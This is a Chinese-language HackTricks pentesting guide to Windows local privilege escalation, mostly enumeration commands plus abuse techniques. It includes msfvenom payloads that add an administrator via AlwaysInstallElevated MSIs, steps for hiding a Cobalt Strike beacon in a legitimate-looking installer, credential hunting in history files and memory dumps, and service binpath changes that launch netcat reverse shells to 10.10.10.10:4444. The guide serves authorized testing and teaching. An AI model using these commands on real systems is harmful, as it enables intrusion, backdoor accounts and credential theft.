# Windows 本地权限提升

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

### **查找 Windows 本地权限提升向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初始 Windows 理论

### 访问令牌

**如果你不知道什么是 Windows 访问令牌，请在继续之前阅读以下页面：**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**查看以下页面以获取有关 ACLs - DACLs/SACLs/ACEs 的更多信息：**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### 完整性级别

**如果你不知道 Windows 中的完整性级别是什么，你应该在继续之前阅读以下页面：**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows 安全控制

Windows 中有不同的内容可能会 **阻止你枚举系统**、运行可执行文件或甚至 **检测你的活动**。你应该 **阅读** 以下 **页面** 并 **枚举** 所有这些 **防御** **机制**，然后再开始权限提升枚举：

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## 系统信息

### 版本信息枚举

检查 Windows 版本是否存在已知漏洞（同时检查已应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本漏洞

这个 [网站](https://msrc.microsoft.com/update-guide/vulnerability) 对于搜索有关 Microsoft 安全漏洞的详细信息非常有用。这个数据库包含超过 4,700 个安全漏洞，显示了 Windows 环境所呈现的 **庞大攻击面**。

**在系统上**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas 已嵌入 watson)_

**使用系统信息本地**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**漏洞的 Github 仓库：**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

环境变量中保存了任何凭据/敏感信息吗？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 转录文件

您可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用此功能。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell 模块日志记录

PowerShell 管道执行的详细信息被记录，包括执行的命令、命令调用和脚本的部分内容。然而，完整的执行细节和输出结果可能不会被捕获。

要启用此功能，请按照文档中“转录文件”部分的说明操作，选择 **"模块日志记录"** 而不是 **"Powershell 转录"**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看PowersShell日志中的最后15个事件，可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **脚本块日志记录**

脚本执行的完整活动和全部内容记录被捕获，确保每个代码块在运行时都被记录。这个过程保留了每个活动的全面审计轨迹，对于取证和分析恶意行为非常有价值。通过在执行时记录所有活动，提供了对该过程的详细洞察。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
日志事件可以在 Windows 事件查看器中找到，路径为：**应用程序和服务日志 > Microsoft > Windows > PowerShell > 操作**。\
要查看最后 20 个事件，可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 互联网设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新不是通过 http**S** 请求而是通过 http 请求，则可以危害系统。

您可以通过运行以下命令检查网络是否使用非 SSL 的 WSUS 更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
如果你收到这样的回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
如果 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 等于 `1`。

那么，**它是可利用的。** 如果最后一个注册表等于 0，则 WSUS 条目将被忽略。

为了利用这些漏洞，您可以使用以下工具： [Wsuxploit](https://github.com/pimps/wsuxploit)， [pyWSUS ](https://github.com/GoSecure/pywsus) - 这些是 MiTM 武器化的利用脚本，用于将“假”更新注入非 SSL WSUS 流量。

在这里阅读研究：

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**在这里阅读完整报告**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
基本上，这是这个漏洞利用的缺陷：

> 如果我们有权修改本地用户代理，并且 Windows 更新使用 Internet Explorer 设置中配置的代理，那么我们就有权在本地运行 [PyWSUS](https://github.com/GoSecure/pywsus) 来拦截我们自己的流量，并以提升的用户身份在我们的资产上运行代码。
>
> 此外，由于 WSUS 服务使用当前用户的设置，它还将使用其证书存储。如果我们为 WSUS 主机名生成自签名证书并将此证书添加到当前用户的证书存储中，我们将能够拦截 HTTP 和 HTTPS WSUS 流量。WSUS 不使用 HSTS 类似机制在证书上实现首次使用信任类型的验证。如果所呈现的证书被用户信任并且具有正确的主机名，则服务将接受它。

您可以使用工具 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) 利用此漏洞（解放后）。

## KrbRelayUp

在特定条件下，Windows **域** 环境中存在 **本地权限提升** 漏洞。这些条件包括 **未强制执行 LDAP 签名** 的环境，用户拥有自我权限，允许他们配置 **基于资源的受限委派 (RBCD)**，以及用户在域内创建计算机的能力。重要的是要注意，这些 **要求** 在 **默认设置** 下满足。

在 [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) 中找到 **利用**。

有关攻击流程的更多信息，请查看 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**如果** 这 2 个注册表 **启用**（值为 **0x1**），则任何权限的用户都可以 **安装**（执行） `*.msi` 文件作为 NT AUTHORITY\\**SYSTEM**。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit 载荷
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果您有一个 meterpreter 会话，您可以使用模块 **`exploit/windows/local/always_install_elevated`** 自动化此技术。

### PowerUP

使用 power-up 中的 `Write-UserAddMSI` 命令在当前目录中创建一个 Windows MSI 二进制文件以提升权限。此脚本写出一个预编译的 MSI 安装程序，该程序提示添加用户/组（因此您需要 GIU 访问权限）：
```
Write-UserAddMSI
```
只需执行创建的二进制文件以提升权限。

### MSI Wrapper

阅读本教程以了解如何使用这些工具创建 MSI 包装器。请注意，如果您**仅**想要**执行** **命令行**，可以包装一个 "**.bat**" 文件。

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### 使用 WIX 创建 MSI

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### 使用 Visual Studio 创建 MSI

* **使用** Cobalt Strike 或 Metasploit 生成一个 **新的 Windows EXE TCP 负载** 在 `C:\privesc\beacon.exe`
* 打开 **Visual Studio**，选择 **创建新项目**，在搜索框中输入 "installer"。选择 **安装向导** 项目并点击 **下一步**。
* 给项目命名，例如 **AlwaysPrivesc**，使用 **`C:\privesc`** 作为位置，选择 **将解决方案和项目放在同一目录**，然后点击 **创建**。
* 一直点击 **下一步**，直到到达第 3 步（选择要包含的文件）。点击 **添加** 并选择您刚生成的 Beacon 负载。然后点击 **完成**。
* 在 **解决方案资源管理器** 中高亮 **AlwaysPrivesc** 项目，在 **属性** 中，将 **TargetPlatform** 从 **x86** 更改为 **x64**。
* 还有其他属性可以更改，例如 **作者** 和 **制造商**，这可以使安装的应用看起来更合法。
* 右键单击项目，选择 **查看 > 自定义操作**。
* 右键单击 **安装**，选择 **添加自定义操作**。
* 双击 **应用程序文件夹**，选择您的 **beacon.exe** 文件并点击 **确定**。这将确保在运行安装程序时立即执行 beacon 负载。
* 在 **自定义操作属性** 下，将 **Run64Bit** 更改为 **True**。
* 最后，**构建它**。
* 如果显示警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保将平台设置为 x64。

### MSI 安装

要在 **后台** 执行恶意 `.msi` 文件的 **安装**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用此漏洞，您可以使用： _exploit/windows/local/always\_install\_elevated_

## 防病毒软件和检测器

### 审计设置

这些设置决定了什么被**记录**，因此您应该注意
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows事件转发，了解日志发送到哪里是很有趣的
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 旨在 **管理本地管理员密码**，确保每个密码都是 **唯一的、随机生成的，并定期更新** 在加入域的计算机上。这些密码安全地存储在 Active Directory 中，只有通过 ACL 授予足够权限的用户才能访问，从而允许他们在获得授权的情况下查看本地管理员密码。

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

如果启用，**明文密码存储在 LSASS**（本地安全授权子系统服务）中。\
[**关于 WDigest 的更多信息请查看此页面**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA 保护

从 **Windows 8.1** 开始，微软引入了增强的本地安全机构 (LSA) 保护，以 **阻止** 不受信任的进程 **读取其内存** 或注入代码，从而进一步增强系统安全性。\
[**关于 LSA 保护的更多信息**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 是在 **Windows 10** 中引入的。它的目的是保护存储在设备上的凭据，防止像 pass-the-hash 攻击这样的威胁。| [**关于 Credentials Guard 的更多信息在这里。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 缓存凭据

**域凭据**由**本地安全机构**（LSA）进行认证，并被操作系统组件使用。当用户的登录数据通过注册的安全包进行认证时，通常会为该用户建立域凭据。\
[**关于缓存凭据的更多信息在这里**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

您应该检查您所属的任何组是否具有有趣的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果你**属于某个特权组，你可能能够提升权限**。在这里了解特权组以及如何滥用它们以提升权限：

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### 令牌操作

**了解更多**关于**令牌**的信息，请访问此页面：[**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens)。\
查看以下页面以**了解有趣的令牌**及其滥用方法：

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### 登录用户 / 会话
```bash
qwinsta
klist sessions
```
### 家庭文件夹
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板的内容
```bash
powershell -command "Get-Clipboard"
```
## 运行进程

### 文件和文件夹权限

首先，列出进程 **检查进程命令行中的密码**。\
检查您是否可以 **覆盖某个正在运行的二进制文件**，或者您是否对二进制文件夹具有写入权限，以利用可能的 [**DLL 劫持攻击**](dll-hijacking/):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查可能正在运行的 [**electron/cef/chromium 调试器**，您可以利用它来提升权限](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件文件夹的权限 (**[**DLL Hijacking**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 内存密码挖掘

您可以使用来自 sysinternals 的 **procdump** 创建正在运行的进程的内存转储。像 FTP 这样的服务在内存中以 **明文形式存储凭据**，尝试转储内存并读取凭据。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI 应用程序

**以 SYSTEM 身份运行的应用程序可能允许用户生成 CMD 或浏览目录。**

示例：“Windows 帮助和支持”（Windows + F1），搜索“命令提示符”，点击“点击打开命令提示符”

## 服务

获取服务列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

您可以使用 **sc** 获取服务的信息
```bash
sc qc <service_name>
```
建议使用来自 _Sysinternals_ 的二进制文件 **accesschk** 来检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查“经过身份验证的用户”是否可以修改任何服务：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[您可以在此处下载适用于XP的accesschk.exe](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果您遇到此错误（例如与SSDPSRV）：

_系统错误 1058 已发生。_\
&#xNAN;_&#x54;该服务无法启动，可能是因为它被禁用或没有与之关联的启用设备。_

您可以使用以下方法启用它：
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意，服务 upnphost 依赖于 SSDPSRV 才能工作（适用于 XP SP1）**

**此问题的另一种解决方法**是运行：
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

在“经过身份验证的用户”组拥有 **SERVICE\_ALL\_ACCESS** 权限的服务场景中，可以修改服务的可执行二进制文件。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
权限可以通过各种权限提升：

* **SERVICE\_CHANGE\_CONFIG**: 允许重新配置服务二进制文件。
* **WRITE\_DAC**: 启用权限重新配置，从而能够更改服务配置。
* **WRITE\_OWNER**: 允许获取所有权和权限重新配置。
* **GENERIC\_WRITE**: 继承更改服务配置的能力。
* **GENERIC\_ALL**: 也继承更改服务配置的能力。

为了检测和利用此漏洞，可以使用 _exploit/windows/local/service\_permissions_。

### 服务二进制文件的弱权限

**检查您是否可以修改由服务执行的二进制文件**，或者您是否在**二进制文件所在的文件夹上具有写权限**（[**DLL Hijacking**](dll-hijacking/)）**。**\
您可以使用 **wmic**（不在 system32 中）获取由服务执行的每个二进制文件，并使用 **icacls** 检查您的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
您还可以使用 **sc** 和 **icacls**：
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 服务注册表修改权限

您应该检查是否可以修改任何服务注册表。\
您可以通过以下方式**检查**您对服务**注册表**的**权限**：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应该检查**Authenticated Users**或**NT AUTHORITY\INTERACTIVE**是否拥有`FullControl`权限。如果是这样，服务执行的二进制文件可以被更改。

要更改执行的二进制文件的路径：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 服务注册表 AppendData/AddSubdirectory 权限

如果您对注册表具有此权限，这意味着**您可以从此注册表创建子注册表**。在 Windows 服务的情况下，这**足以执行任意代码：**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### 未加引号的服务路径

如果可执行文件的路径没有加引号，Windows 将尝试执行每个在空格之前的结尾。

例如，对于路径 _C:\Program Files\Some Folder\Service.exe_，Windows 将尝试执行：
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的服务路径，排除属于内置Windows服务的路径：
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**您可以使用** metasploit 检测和利用此漏洞： `exploit/windows/local/trusted\_service\_path` 您可以手动创建一个服务二进制文件，使用 metasploit：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定在服务失败时采取的操作。此功能可以配置为指向一个二进制文件。如果这个二进制文件是可替换的，可能会实现权限提升。更多细节可以在 [官方文档](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN) 中找到。

## 应用程序

### 已安装的应用程序

检查 **二进制文件的权限**（也许你可以覆盖一个并提升权限）和 **文件夹** ([DLL Hijacking](dll-hijacking/))。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写权限

检查您是否可以修改某些配置文件以读取某些特殊文件，或者您是否可以修改将由管理员帐户（schedtasks）执行的某些二进制文件。

查找系统中弱文件夹/文件权限的一种方法是：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 开机时运行

**检查您是否可以覆盖某些将由不同用户执行的注册表或二进制文件。**\
**阅读**以下页面以了解有关有趣的**自动运行位置以提升权限**的更多信息：

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### 驱动程序

寻找可能的**第三方奇怪/易受攻击**驱动程序
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

如果您在 PATH 中的某个文件夹内具有 **写入权限**，您可能能够劫持由进程加载的 DLL 并 **提升权限**。

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## 网络

### 共享
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

检查 hosts 文件中硬编码的其他已知计算机
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口与DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

检查外部的 **受限服务**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**查看此页面以获取与防火墙相关的命令**](../basic-cmd-for-pentesters.md#firewall) **(列出规则，创建规则，关闭，关闭...)**

更多[网络枚举命令在这里](../basic-cmd-for-pentesters.md#network)

### Windows 子系统 for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 中找到。

如果你获得了 root 用户权限，你可以在任何端口上监听（第一次使用 `nc.exe` 在端口上监听时，它会通过 GUI 询问是否允许 `nc` 通过防火墙）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要轻松以 root 身份启动 bash，您可以尝试 `--default-user root`

您可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中浏览 `WSL` 文件系统

## Windows 凭据

### Winlogon 凭据
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
